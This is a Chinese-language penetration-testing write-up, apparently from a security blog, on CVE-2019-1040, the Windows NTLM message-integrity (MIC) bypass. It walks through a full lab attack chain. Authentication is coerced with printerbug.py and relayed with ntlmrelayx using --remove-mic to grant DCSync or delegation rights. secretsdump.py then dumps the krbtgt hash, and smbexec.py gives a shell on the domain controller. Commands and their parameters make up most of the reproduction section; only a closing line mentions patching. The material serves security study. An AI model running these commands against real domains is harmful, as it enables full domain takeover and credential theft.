## 漏洞背景

2019年6月11日，微软发布6月份安全补丁更新。在该安全补丁更新中，对 CVE-2019-1040 漏洞进行了修复。该漏洞存在于Windwos
大部分版本中，当中间人攻击者能够成功绕过NTLM 消息完整性校验（MIC）时，Windows 存在可能可篡改的漏洞。成功利用此漏洞的攻击者可以获得降级
NTLM 安全功能的能力。要利用此漏洞，攻击者需要篡改NTLM 交换，然后修改NTLM
数据包的标志，而不会使签名无效。结合其他漏洞和机制，在某些场景下，攻击者可以在仅有一个普通账户域账户的情况下接管全域。

## 漏洞原理

该漏洞关键之处在于安全研究员能绕过NTLM消息完整性的校验，那么安全研究员是如何实现的呢?

由于Windwos 服务器允许无消息完整性校验的NTLM Authenticate 消息，因此该漏洞绕过消息完整性校验的思路是取消数据包中的 MIC
标志，操作如下：

  * 从NTLM Authenticate消息中删除MIC字段和Version字段，如图所示：

![图片.png](https://image.3001.net/images/20230605/1685975691_647df28bdd8e4dac6f8c1.png!small)

  * 将 Negotiate Version 标志位设置为Not set，如图所示：

![图片.png](https://image.3001.net/images/20230605/1685975711_647df29ff24502e610668.png!small)

## 漏洞完整利用链

绕过NTLM的消息完整性校验只是第一步，之后能做什么呢？

漏洞完整利用链需要结合NTLM Relay。完整的攻击链如下：

1）使用域内任意有效账户，通过SMB连接到目标机器，使用Print Spooler 漏洞或者PetitPotam漏洞强制触发目标机器向指定的机器进行NTLM
认证；

2）中继服务器收到目标机器的NTLM 认证流量后，通过删除相应的字段绕过NTLM 的完整性校验并修改NTLM 数据包的标志位使得其从SMB协议中继到LDAP
不需要签名；

3）使用中继的LDAP流量，通过LDAP远程连接域控，执行高权限操作，赋予指定的账户高权限；

4）使用提升了权限的账户进行“后利用”，接管全域。

### 1、触发目标NTLM请求

攻击者需要向目标机器发起NTLM请求才能进行NTLM Relay利用，这里可以利用使用Print Spooler
漏洞或者PetitPotam漏洞强制触发目标机器向指定的机器进行NTLM 认证；详情见[内网渗透(六十二)之 NTLM Realy
攻击](https://blog.csdn.net/qq_64973687/article/details/130456405?spm=1001.2014.3001.5501)

### 2、LDAP 签名绕过

由于通过Print Spooler 漏洞和PetitPotam漏洞触发的NTLM 认证都是基于SMB协议的，因此安全研究员需要将SMB
协议的身份验证流量通过LDAP中继到域控。但是NTLM
认证的工作方式决定了无法直接将SMB协议流量中继到LDAP。默认情况下，客户端和域控或Exchange服务器进行SMB通行时，是强制要求签名的。其NTLM
身份验证流量的如下标志均为Set，如图所示:

  * Negotiate Key Exchange;

  * Negotiate Always Sign;

  * Negotiate Sign。

![图片.png](https://image.3001.net/images/20230605/1685975732_647df2b4537520db6f9ac.png!small)

此时将SMB流量中继到LDAP时，由于Negotiate Sign 和 Negotiate Always Sign
标志为Set，该标志位触发LDAP签名。而安全研究员又无法伪造签名，因此会被LDAP忽略，导致攻击失败。前面提到了CVE-2019-1040的关键就在于安全研究员能绕过NTLM的消息完整性校验，导致可以任意修改NTLM认证的的数据包。因此安全研究员在绕过消息完整性校验之后，可以修改流量的标志位已协商不开启LDAP签名校验。具体措施是将以下标志位设置为
Not Set，如图所示：

  * Negotiate Key Exchange;

  * Negotiate Always Sign;

  * Negotiate Sign。

![图片.png](https://image.3001.net/images/20230605/1685975747_647df2c3eac570f9686dc.png!small)

### 3、攻击目标的选择

攻击目标可以是域内的任意机器。这里以域控和Exchange服务器为列，原因在于默认情况下两者在域内具有最高权限，对其进行攻击可以直接接管全域。

（1）攻击Exchange服务器

使用任何有效域用户，利用Print Spooler 漏洞或者PetitPotam漏洞强制触发目标Exchange
服务器向安全研究员主机进行NTLM认证。安全研究员主机接收到目标Exchange
服务器的认证流量后，通过修改NTLM认证数据包绕过NTLM的消息完整性校验和LDAP签名，将其认证流量通过LDAP中继到域控。使用中继的LDAP身份验证，为安全研究员指定的账户赋予DCSync权限，然后使用指定账户利用DCSync权限转储活动目录中所有密码Hash，即可接管全域。

（2）攻击域控

使用任一有效域用户，在域内创建一个可控的机器账户。然后使用Print Spooler
漏洞或者PetitPotam漏洞强制触发目标域控向安全研究员机器进行NTLM认证。安全研究员机器接收到目标域控的认证流量后，通过修改NTLM认证数据包绕过NTLM的消息完整性检验和LDAP签名，将其认证流量到LDAP中继到另一个域控。使用中继的LDAP身份验证，为安全研究员指定的可控机器账户赋予基于资源的约束性委派权限，然后利用该机器账户申请访问目标域控的服务票据，即可接管全域。

## 漏洞影响版本

  * Windwos 7 SP 1 至 Windows 10 1903；

  * Windows Server 2008 至 Windows Server 2019

## 漏洞复现

下面通过攻击Exchange服务器和域控来演示漏洞复现：

### 1、攻击Exchange服务器

实验环境如下：

  * 域控：192.168.41.10

  * Exchange服务器：192.168.41.50，主机名：Exchange

  * 安全研究员：192.168.41.19

  * 普通域用户：hack\hack，密码为Admin123

整个利用链如图所示：

![图片.png](https://image.3001.net/images/20230605/1685975763_647df2d3066cec75236e6.png!small)

首先在安全研究员机器中执行如下的命令进行监听：

    
    
    python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://192.168.41.10 -smb2support --no-dump -debug
    

![图片.png](https://image.3001.net/images/20230605/1685975780_647df2e4d306f864469d4.png!small)

参数的含义如下：

  * \--remove-mic：用于绕过NTLM的消息完整性校验

  * \--esclate-user:用于指定用户DCSync权限

  * -t:将认证凭据中继到指定LDAP

  * -smb2support:用于支持SMB2协议

  * \--no-dump: 表示获得DCSync权限后不导出域内所有用户的Hash

  * -debug：用于显示日志信息

接着安全研究员使用printbug.py脚本执行如下的命令，以用户hack\hack身份连接Exchange服务器，触发Exchange服务器的Print
Spooler 漏洞，该漏洞会强制触发目标Exchange 服务器向指定的安全研究员机器进行NTLM认证，如图所示：

脚本下载地址：`https://github.com/dirkjanm/krbrelayx`

    
    
    python3 printerbug.py hack/hack:Admin123@192.168.41.50 192.168.41.19
    

![图片.png](https://image.3001.net/images/20230605/1685975797_647df2f58fd460f558fa6.png!small)

然后安全研究员就可以收到目标Exchange服务器发过来的NTLM认证流量了，再将此NTLM认证流量绕过NTLM的消息完整校验并修改LDAP协商数据包中的相应标志位来使得协商不需要签名。再通过LDAP中继给到域控，LDAP中执行的高权限操作是赋予用户hack
DCSync权限。

如图所示，可以看到该脚本首先会遍历中继的机器账户的权限，发现目标Exchange服务器的机器账户在域内的机器账户拥有创建和修改域ACL的权限。接着该脚本会修改域的ACL来提权，因为它相比创建高权限用户更为隐蔽。通过修改用户hack的ACL，为其赋予DCSync权限。

![图片.png](https://image.3001.net/images/20230605/1685975814_647df306aaad5faa01753.png!small)

域普通用户hack被赋予DCSync权限后，可以直接导出域内所有用户的Hash。此时使用secretsdump.py脚本执行如下的命令，即可导出账户Krbtgt的Hash。

    
    
    python3 secretsdump.py hack.com/hack:Admin123@192.168.41.10 -just-dc-user krbtgt
    

![图片.png](https://image.3001.net/images/20230605/1685975827_647df313958c1eb449d1b.png!small)

### 2、攻击域控

攻击域控需要目标域内至少存在两台域控：一台用于触发Print Spooler
漏洞或PetitPotam漏洞，另一台用于继中LDAP流量执行高权限操作（同一机器的流量中继回去会失败）。

攻击域控有以下两种情况：  
1）目标域支持LDAPS：可以直接利用ntlmrelaxy.py脚本中继时创建的机器账户并赋予委派的权限（远程添加用户，需要LDAPS）  
2）目标域不支持LDAPS：可以首先自己创建一个机器账户，然后赋予委派权限。以下实验基于这种情况。

实验环境如下：

  * 域控1：192.168.41.10，主机名为:DC

  * 域控2：192.168.41.40，主机名为：DC2

  * 安全研究员：192.168.41.19

  * 普通域用户：hack\hack，密码为Admin123

整个利用链，如图所示：

![图片.png](https://image.3001.net/images/20230605/1685975844_647df3246bbeb3e1e5618.png!small)

安全研究员以普通域账户hack\hack的身份在域内主机上使用Powershell脚本执行如下的命令创建一个机器账户的machine$,密码为root。

    
    
    Import-Module .\Powermad.ps1
    New-MachineAccount -MachineAccount machine_account
    

![图片.png](https://image.3001.net/images/20230605/1685975870_647df33e4753a9d6c29d3.png!small)

然后在安全研究员机器192.168.41.19上执行如下的命令进行监听：

    
    
    #目标域不支持LDAP，可以使用如下的命令，指定刚刚创建的机器账户machine$
    python3 ntlmrelayx.py -t ldap://192.168.41.10 -smb2support --remove-mic --delegate-access --escalate-user machine\\$
    #目标域支持LDAP，可以使用如下的命令，会自动创建机器账户
    python3 ntlmrelayx.py -t ldaps://192.168.41.10 -smb2support --remove-mic --delegate-access 
    

![图片.png](https://image.3001.net/images/20230605/1685975885_647df34d5dee135c61bcf.png!small)

参数的含义如下：

  * -t：将认证凭据中继到指定LDAP

  * -smb2support：用于支持SMB2协议

  * \--remove-mic：用于绕过NTLM的消息完整校验性

  * \--delegate-access：用于指定委派

  * \--escalate-user：指定需要赋予委派权限的用户

接着使用printbug.py脚本执行如下的命令，使用户hack\hack连接域控DC2，触发域控DC2的Print Spooler
漏洞，该漏洞会强制触发目标域控DC2向安全研究员机器进行NTLM认证。

    
    
    python3 printerbug.py hack.com/hack:Admin123@192.168.41.40 192.168.41.19
    

![图片.png](https://image.3001.net/images/20230605/1685975913_647df369b9d9b7a9333b1.png!small)

然后就可以收到目标域控DC2发过来的NTLM认证流量了，再将此NTLM认证流量绕过NTLM的消息完整性的校验并修改LDAP协商的数据包中的相应标志位来使得协商不需要签名。再通过LDAP中继到域控DC，LDAP中执行的最高权限的操作是赋予机器账户machine$对域控DC2的基于资源的约束性委派的权限。

如图所示，可以看到机器账户machine$已经拥有对域控DC2基于资源的约束性委派了。

![图片.png](https://image.3001.net/images/20230605/1685975927_647df377afc855e12fe91.png!small)

此时机器账户machine$已经拥有对域控DC2基于资源的约束性委派权限了，可以执行如下的命令进行后利用，如图所示，利用完成后即可导出域内任意用户的Hash，也可以直接远程连接域控DC2。

    
    
    #以Administrator身份申请访问DC2机器的CIFS票据
    python3 getST.py -spn cifs/DC2.hack.com hack/machine\\$:root -dc-ip 192.168.41.10 -impersonate administrator
    #导入申请的服务票据
    export KRB5CCNAME=administrator.ccahe
    #导出域内用户的krbtgt的Hash
    python3 secretsdump.py -k -no-pass DC2.hack.com -just-dc-user krbtgt
    #远程连接DC2机器
    python3 smbexec.py -no-pass -k DC2.hack.com -codec gbk
    

![图片.png](https://image.3001.net/images/20230605/1685975943_647df38768add4aca417f.png!small)

![图片.png](https://image.3001.net/images/20230605/1685975955_647df3933b5aedbd4ddb2.png!small)

## 漏洞预防和修复

对于防守方或蓝队来说，如何针对CVE-2019-1040 NTLM MIC 绕过漏洞进行预防和修复呢？

微软已经发布了该漏洞的补丁程序，可以直接通过Windows自动更新解决以上问题，也可以手动下载更新补丁程序进行安装。

